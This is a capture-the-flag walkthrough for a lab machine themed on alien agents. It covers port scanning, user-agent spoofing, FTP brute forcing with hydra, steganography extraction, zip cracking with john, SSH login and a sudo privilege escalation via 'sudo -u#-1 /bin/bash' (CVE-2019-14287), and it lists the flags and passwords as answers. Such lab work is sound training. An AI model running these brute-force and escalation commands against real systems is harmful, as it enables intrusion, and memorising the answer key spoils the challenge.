# Task 2 Enumerate
### How many open ports?

`nmap -Pn -p- -T4 -sS $target`

3 ports - 21,22 and 80.  Lets do `-sV` on them

`nmap -Pn -p 21,22,80 -T4 -sS $target -sV`

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Answer: `3`

### How you redirect yourself to a secret page?

Look at the webpage,
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

No hidden text or anything in the source

Wappalyzer shows Apache 2.4.29, PHP and Ubuntu.

Go buster to look for other locations
`gobuster dir -u $target -w /usr/share/dirb/wordlists/common.txt`


Modifying the useragent in Firefox, with a setting of `R` gives the message
```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident

Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

Answer: `user-agent`

### What is the agent name?

User-agent `A` returns the original message, as does `B`.  `C` provides
```
http://10.10.221.52/agent_C_attention.php
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```

Answer: `chris`

# Task 3 Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

### FTP password

`hydra -l chris -P /usr/share/dirb/wordlists/common.txt ftp://$target -v`
This ultimately was not successful, however using the rockyou.txt list the password was found

Answer: `crystal`

### Zip file password

Download the 3 files
1 x jpg, 1 x png, 1 x txt

Check the txt file
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

`strings cute_alien.jpg` doesn't reveal anything interesting.
`strings cutie.png` reveals a couple at the end
```
p7a4u
^[=&
IEND
To_agentR.txt
W\_z#
2a>=
To_agentR.txt
EwwT
```

Install stegoveritas - https://github.com/bannsec/stegoVeritas/
```
pip3 install stegoveritas
./.local/bin/stegoveritas_install_deps

./.local/bin/stegoveritas /home/kali/cutie.png
```
returns
```
Found something worth keeping!
PNG image data, 528 x 528, 8-bit colormap, non-interlaced
+--------+------------------+---------------------------------------------------------------------------------------------+---------------+
| Offset | Carved/Extracted | Description                                                                                 | File Name     |
+--------+------------------+---------------------------------------------------------------------------------------------+---------------+
| 0x365  | Carved           | Zlib compressed data, best compression                                                      | 365.zlib      |
| 0x365  | Extracted        | Zlib compressed data, best compression                                                      | 365           |
| 0x8702 | Carved           | Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt | 8702.zip      |
| 0x8702 | Extracted        | Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt | To_agentR.txt |
+--------+------------------+---------------------------------------------------------------------------------------------+---------------+
```

So the zip file appears to be in the PNG file

`ls -la ./results/keepers`
returns
```
total 368
drwxr-xr-x 2 kali kali   4096 Oct 11 23:41 .
drwxr-xr-x 4 kali kali  12288 Oct 11 23:41 ..
-rw-r--r-- 1 kali kali  34842 Oct 11 23:41 1697082101.3011541-f4ee2de173262e60471b4d695387633f
-rw-r--r-- 1 kali kali 279312 Oct 11 23:41 365
-rw-r--r-- 1 kali kali  33973 Oct 11 23:41 365.zlib
-rw-r--r-- 1 kali kali    280 Oct 11 23:41 8702.zip
-rw-r--r-- 1 kali kali      0 Oct 29  2019 To_agentR.txt
```

There is a PNG image file, an empty txt file, and a .zip file.
Zip file is password protected
`zip2john 8702.zip > 8702hash.txt`
`john --wordlist=/home/kali/rockyou.txt 8702hash.txt`
We get the results nearly immediately.

### steg password
From there open the zip file, read the .txt file

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Using Cyberchef to look at the password, it is base64 encoded `Area51`

Answer: `Area51`

### Who is the other agent (in full name)?

Using `stegoveritas` on the `cute-alien.jpg` there is an embedded `7z` file in it.  Extracting that it was empty.  Using `hexedit` on the file showed data, but no strings, and nothing that looked like a file format.

`steghide --info cute-alien.jpg` and providing it the `Area51` password showed a `message.txt`

`steghide --extract -sf cute-alien.jpg` and providing the password extracted the message.

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Answer: `james`

### SSH password

Answer: `hackerrules!`


# Task 4 Capture the user flag

You know the drill.

### What is the user flag?

ssh into the target as james using the stolen credentials.

`cat user_flag.txt`

Answer: `b03d975e8c92a7c04146cfa7a5a313c7`

### What is the incident of the photo called?

We can see an Alien_autospy.jpg file in the user profile.  Lets grab that and see what it is.
Its an image of an alien, no other properties on the photo.  Use Tineye and see it is part of a fake alien autopsy.

Answer: `Roswell alien autopsy`

# Task 5 Privilege escalation

Enough with the extraordinary stuff? Time to get real.

### CVE number for the escalation

`sudo -l` returns
```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

https://www.exploit-db.com/exploits/47502

Lets
```
sudo -u#-1 /bin/bash`
whoami
```

Answer: `cve-2019-14287`

### What is the root flag?

`cat /root/root.txt`

Answer: `b53a02f55b57d4439e3341834d70c062`


### (Bonus) Who is Agent R?

Answer: `DesKel`